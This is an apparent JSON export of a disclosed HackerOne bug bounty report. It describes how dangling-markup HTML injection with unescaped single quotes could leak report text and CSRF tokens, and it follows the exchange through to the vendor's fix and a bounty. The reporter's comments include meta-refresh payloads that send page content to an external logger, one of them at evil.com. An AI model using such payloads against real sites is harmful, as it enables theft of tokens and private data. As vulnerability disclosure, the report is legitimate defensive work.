{"id":110578,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTA1Nzg=","url":"https://hackerone.com/reports/110578","title":"HTML injection can lead to data theft","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-01-13T23:59:29.009Z","submitted_at":"2016-01-13T23:59:29.009Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"intidc","url":"/intidc","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-01-26T16:05:58.643Z","bug_reporter_agreed_on_going_public_at":"2016-01-26T16:05:58.005Z","team_member_agreed_on_going_public_at":"2016-01-26T02:26:36.122Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hey,\n\nThis is more like an in-depth security thing with a reasonable attack scenario.\n\nIn some occasions, it seems to be possible to leak sensitive data to an external server, not affected by the CSP. This can happen in the following situation:\n\n1. There's a HTML injection vulnerability\n2. The sensitive data is preceded by the HTML injection vulnerability\n3. After the sensitive data, there's a single quote (could be inserted by the attacker)\n\nDue to these requirements I haven't been able to test it, though I did found some places where it theoretically could work.\n\nThe problem is that HackerOne does not convert single quotes to their HTML entities (\u0026lsquo;), not in their own texts, nor in user-supplied fields (like report title, body, ...). This will make browser interpret the data between the quote and the HTML injection an attribute in some cases. Using anchor tags or meta redirects, we can capture this data using a logger stored at a remote server.\n\n## Example\n\nSay someone has found a way to inject HTML into a comment,  summary or report, he could read the internal team messages. Here's a quick sketch of a report to illustrate this:\n\n[report title]\n\\\u003e reporter: report body\n \u003c vendor: reply\n \u003c vendor: internal reply\n\\\u003e reporter: comment (that contains a single quote)\n\nAt this point, if the reporter would add the following to the summary (above the report body):\n\n\u003e \u003cmeta http-equiv=\"refresh\" content='0; url=https://evil.com/log.php?text=\n\nThis will send the following to the server:\n\n\u003ereport body + vendor reply + internal reply\n\nBecause the unconverted ' in the last comment would close the attribute and form a valid HTML element.\nYou could also do this with an anchor tag an its href attribute, but this would require more user interaction as the target would also have to click on the malicious link.\n\nAnother vulnerable layout would be for example the list of reports: if an attacker would be able to get HTML injection in the title, he could easily steal other reports titles using this technique.\n\n## The fix\n\nThe behavior described above can easily be prevented.: \n\nI'd just add the conversion to \u0026lsquot  to your sanitization filter. I can't think of any legit case where this would cause troubles. Also, it can be a good practice to convert single quotes to their HTML entities in HackerOne provided texts as well.\n\n\nBest regards\n\n\nInti","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-02-25T02:26:36.443Z","allow_singular_disclosure_after":-177591499.38480398,"singular_disclosure_allowed":true,"vote_count":16,"voters":["intidc","updatelap","r3y","its_afolic","satishpk1","trieulieuf9","japz","spetr0x","safisec","dyabla","and 6 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":757285,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"*lsquo, sorry.\n\nI saw some pages actually include the CSRF token in the page body. If there would be a single quote somewhere after the form, let's say in the footer, a simple HTML injection before the hidden CSRF field could grab the token.","automated_response":false,"created_at":"2016-01-14T08:04:27.398Z","updated_at":"2016-01-14T08:04:27.398Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":757312,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Happen to know which pages have the CSRF token embedded in them, besides the one mentioned in #103787?","automated_response":false,"created_at":"2016-01-14T08:41:01.379Z","updated_at":"2016-01-14T08:41:01.379Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":757320,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Well most of the team and account edit settings pages seem to do. Haven't found any of these at risk right now (in contrary to the examples mentioned above). But as a regular single quote could trigger this behavior, I'd make sure to convert the single quotes at these pages as well.","automated_response":false,"created_at":"2016-01-14T08:53:51.502Z","updated_at":"2016-01-14T08:54:19.701Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":758096,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For your information: I did find a page that'd leak the auth token, for example this page:\n\nhttps://hackerone.com/mobilevikings/groups/8275/edit (team group edit page)\n\nDisplays the group name before and after the token. \n\nSo if an attacker would be able to change it to \n\n\u003e \"\u003e'\u003e\u003cmeta http-equiv=\"refresh\" content='0; url=http://www.ceukelai.re/log.php?text=\n\nHe can steal the token.\n\nScreenie of simulation attached. Even though this particular example probably won't ever be an issue, it proves that there's a potential risk linked to this issue.\n\n","automated_response":false,"created_at":"2016-01-14T18:36:28.685Z","updated_at":"2016-01-14T18:36:38.516Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":69324,"filename":"h1HTMLCSRF.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/069/324/0fe1db7aa4d48cd5cc0e0db7fae651c00bfabd78/h1HTMLCSRF.png?response-content-disposition=attachment%3B%20filename%3D%22h1HTMLCSRF.png%22%3B%20filename%2A%3DUTF-8%27%27h1HTMLCSRF.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7H6NCLCA%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132455Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIBCjdoUai95GqoqRdZPvewVTGWTu7hW9M1xsEa2tnJ2wAiEApQcvVvkI%2BBsK0ecHviHNOIueIogzHcih4FNXbWCzeVkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF%2BSeVXC33iyV8QWeSrXA1ssE%2FEGIWSZ%2FuRCd4oXxa0L1Lxp%2FgZ3zVMnFb3xAeki0kryhhssKmftZAynWR2Q1zaBR53gjdraq6wRyIKeaN10nGH%2BCzjURsH34KRC1TOwts5MYcloS6LERgqr1SpV%2B%2FyQzDTgT2kS7g6IE%2FPeoepcFFJMxl5IvtRGcabRXuEPLRYcxt7w6jKNei1awCDyq1irj02Z42QRBSTvkYgIOHYNLMFYX3E%2F0tFI1gV2NfcCmFszpeFyasntII3Gyw3H1an6BrUGChcOYIfu%2F1WTbUdNI%2Fpjmr10lpa6XlUtxFI9c0eKAVGXcoQ3EJHRTPyWcd6Gnq4TSlpHL0D54jaEQGHBDeDUxeA6DotTHBbroOpxOoq6S1nhZ0OMb3p%2BjXCBVueAHtDFqN%2Bnjx3qwjEEfRqnOUZVwu2AW7uQZCfC2vw4kynhx1t%2FbtkiC5KthO6jIzK1h%2FjH9uqYT0bwnLaiuJs7%2Fa0R8E%2FhplfGIzFmI%2BPPnknXwAmmWU9Xa%2Bm189leh9xBp6nNN7ufioFPFK77gl8s%2FXWhnHHRwfkQk2D0unemyL2YGJyVofMRhz7FlOLdoDcPt%2FVEvFBOEQOr5BaJlpQMGIbhI0gXAmjbeZwS3uck7lnUXN7N%2BDCB7ZCLBjqlASAOgKdryIO2D5AU3ejK49G6vrtKAglCcTf7cFkw0ROVtRedKGY3KUk5E3StqVBKZSdhowAIQjfqwiAkemJwzUJGbeun1p67EPamOv2EPpEqY6R88tB4ybHuSsWOJiykQnbihgfjANmR19lVcpFUZpvB6v00p8I6H%2F%2FUOjnFdoCXZkBX1hdc0Cr9U5xZqBbFVM8Hds5wc%2BboAR7bu67Z%2Fvqp9K%2BbZg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4189780d2cc6d4223bfdf29827a50d6fac86fcf01a29e6bfe8b20c2db6bd52a0"}],"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":758482,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks @intidc for the additional details. We will see what we can do here.","automated_response":false,"created_at":"2016-01-14T21:53:33.019Z","updated_at":"2016-01-14T21:53:33.019Z","actor":{"username":"andrewone","cleared":false,"url":"/andrewone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":759306,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Note: use \u0026apos; (apos) instead of \u0026lsquo; (lsquo)/\u0026rsquo; (rsquo)","automated_response":false,"created_at":"2016-01-15T13:44:07.509Z","updated_at":"2016-01-15T13:45:06.157Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":760157,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @intidc,\n\nIn your example, how is the attacker stealing the CSRF token using that meta refresh tag? Also, wouldn't the attacker need to be a team admin in this case?","automated_response":false,"created_at":"2016-01-15T23:34:02.757Z","updated_at":"2016-01-15T23:34:02.757Z","actor":{"username":"andrewone","cleared":false,"url":"/andrewone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":760170,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey Andrew,\n\nIf the injection is successful, the url part of the META attribute would look like this (it's highlighted in blue in the screenshot I provided earlier)\n\nhttp://www.ceukelai.re/log.php?text=\u003c/h2\u003e\u003c/div\u003e\u003cform class=\"edit_team_member_group\"... {bunch of stuff including the token}, until we reach the next single quote located in the team_member_group_name input field. \n\nSo if the victim would visit the page, he would be redirected to my logging script and the HTML data, including the form token would be passed as a GET parameter (text). Once my logger receives the HTML, it can extract the token and abuse it. If single quote were encoded as, for example \u0026apos, this wouldn't happen as there would no way for an attacker to enclose the form data in the refresh URL argument.\n\nOn the attack scenario: yes, I suppose - but that's just an example of the CSRF token leakage. At this moment an attack on the report page (see initial post) would be more likely to happen. If H1 would have an unconverted single quote somewhere in the footer, all pages would be at risk.\n\nHave a nice weekend,\n\nInti ","automated_response":false,"created_at":"2016-01-15T23:48:20.042Z","updated_at":"2016-01-15T23:48:20.042Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":764643,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Quick update here -- I'm still working on a fix. It's a little more complicated than what I'd initially thought since we use different renderers for different parts of the UI.","automated_response":false,"created_at":"2016-01-20T02:38:45.523Z","updated_at":"2016-01-20T02:38:45.523Z","actor":{"username":"andrewone","cleared":false,"url":"/andrewone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":764764,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Take tour time! A good fix \u003e a quick fix. Let me know if you need any help.\n\n -Inti","automated_response":false,"created_at":"2016-01-20T05:35:19.445Z","updated_at":"2016-01-20T05:35:41.723Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":764913,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"See also https://stackoverflow.com/questions/2083754/why-shouldnt-apos-be-used-to-escape-single-quotes for why it may make more sense to use `\u0026#39;` instead of `\u0026apos;`. Note that Ruby's `CGI.escapeHTML` uses `\u0026#39;` as well.","automated_response":false,"created_at":"2016-01-20T10:07:39.416Z","updated_at":"2016-01-20T10:07:39.416Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":769615,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Interesting point @reed, thanks!\n\nI think browsers should also implement a meta-refresh CSP directive. Apparently someone proposed this [back in 2011](https://lists.w3.org/Archives/Public/public-web-security/2011Jun/0157.html).","automated_response":false,"created_at":"2016-01-23T17:37:13.341Z","updated_at":"2016-01-23T17:37:13.341Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771613,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @intidc,\n\nThere is some underlying issue that could not be solved easily and will require some further investigation, but we've deployed an interim fix that escapes the quotes in any Markdown that is passed to the front end. Can you verify that this resolves the immediate risk?","automated_response":false,"created_at":"2016-01-25T22:28:45.254Z","updated_at":"2016-01-25T22:28:45.254Z","actor":{"username":"andrewone","cleared":false,"url":"/andrewone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771632,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, I can confirm this eliminates the risk of the example I provided (team group edit page), however, single quotes in user generated content (such as report bodies and titles, summaries, replies) don't seem to be escaped yet, so the risk remains.","automated_response":false,"created_at":"2016-01-25T22:44:45.590Z","updated_at":"2016-01-25T22:44:45.590Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771715,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@intidc,\n\nAll our other UGC is embedded within React components, which should be safe according to documentation:\n\u003e By default, React escapes the HTML to prevent XSS. If you really want to render HTML, you can use the dangerouslySetInnerHTML property.\n\nI've experimented with escaping in our various layers, from the JSON assembled by JBuilder to the CJSX in our React components, but none of this adds any additional value. With React auto-escaping/unescaping during the rendering process, any quote mark within our values should not accidentally match up with an unterminated quote mark from an injected HTML node.\n\nLet me know if there's anything I may have missed.","automated_response":false,"created_at":"2016-01-26T00:09:45.883Z","updated_at":"2016-01-26T00:09:45.883Z","actor":{"username":"andrewone","cleared":false,"url":"/andrewone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771731,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the info, I've overseen that. Should be good! Thanks for the fix!","automated_response":false,"created_at":"2016-01-26T00:22:53.714Z","updated_at":"2016-01-26T00:22:53.714Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771840,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2016-01-26T02:25:49.383Z","updated_at":"2016-01-26T02:25:49.383Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"intidc","url":"/intidc"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771841,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for the report, @intidc! Happy hacking!","automated_response":false,"created_at":"2016-01-26T02:26:24.451Z","updated_at":"2016-01-26T02:26:24.451Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"HackerOne"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"intidc","url":"/intidc"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771843,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-01-26T02:26:36.146Z","updated_at":"2016-01-26T02:26:36.146Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":772585,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Awesome, thanks for the bounty!","automated_response":false,"created_at":"2016-01-26T16:05:58.047Z","updated_at":"2016-01-26T16:05:58.047Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":772586,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-01-26T16:05:58.673Z","updated_at":"2016-01-26T16:05:58.673Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":773222,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @intidc,\n\nIt has been brought to our attention that the fix we released causes some undesirable side effects, so we will be rolling back the fix. The issue will thereby remain intact until we find a better solution.","automated_response":false,"created_at":"2016-01-26T22:45:59.041Z","updated_at":"2016-01-26T22:45:59.041Z","actor":{"username":"andrewone","cleared":false,"url":"/andrewone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":809414,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"A new fix has been deployed, so this should now be fixed once again.","automated_response":false,"created_at":"2016-02-23T21:48:39.117Z","updated_at":"2016-02-23T21:48:39.117Z","actor":{"username":"andrewone","cleared":false,"url":"/andrewone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":809532,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Cool, thanks for the fix!","automated_response":false,"created_at":"2016-02-23T22:50:57.632Z","updated_at":"2016-02-23T22:50:57.632Z","actor":{"username":"intidc","cleared":true,"url":"/intidc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":1257,"category":"team","content":"There was a legitimate issue in our app where Markdown was not being escaped properly, but it was not immediately exploitable since it relies on the existence of an injection vulnerability (which can theoretically be introduced in the future). The issue was a real issue that we did not know existed, verified through an investigation and finally patched up.\n\nWe rely on our implementation of Redcarpet to escape the HTML output of any Markdown input, and this output is passed directly into our DOM via `dangerouslySetInnerHTML` in our React component. Because it turns out that we weren't properly escaping this HTML output, this could potentially be exploited.\n\nAll other non-Markdown user-generated content is displayed via React without using `dangerouslySetInnerHTML`, so it is auto-escaped by React and thus not vulnerable to an exploit.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":15236,"username":"andrewone","name":"Andrew Wong","bio":"","cleared":false,"website":"","location":"San Francisco","created_at":"2014-12-12T22:07:54.110Z","url":"https://hackerone.com/andrewone","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":null,"profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBbHNQIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--4d79b8f1f42f38dbd7844698fb7efa3f846fedcf/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9MY21WemFYcGxTU0lOTWpZd2VESTJNRDRHT2daRlZBPT0iLCJleHAiOm51bGwsInB1ciI6InZhcmlhdGlvbiJ9fQ==--7e37b612eb3c91a96f98ad01ca9fbe53cab870dd/avatar_andrew.png"}}},{"id":1260,"category":"researcher","content":"Navigation is something a content security policy can't cover. In some cases, HTML markup, including CSRF tokens, can be encapsulated in an attribute value, as is the case with the url attribute of the meta redirect element, or the href attribute of an anchor tag. This makes it possible for an attacker to send the encapsulated HTML, sometimes containing sensitive information and tokens, as a GET parameter to a remove server. In order to mitigate the risk you can convert your single quotes to their HTML equivalent `\u0026#39;`, as both single and double quotes can be used to enclose an attribute value.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":2322,"username":"intidc","name":"Inti De Ceukelaire","bio":"@securinti","cleared":true,"website":"http://twitter.com/securinti","location":"Oilsjt, Belgium","created_at":"2014-01-19T21:00:55.430Z","url":"https://hackerone.com/intidc","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"hacker_resume_enabled":true,"user_type":"legacy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}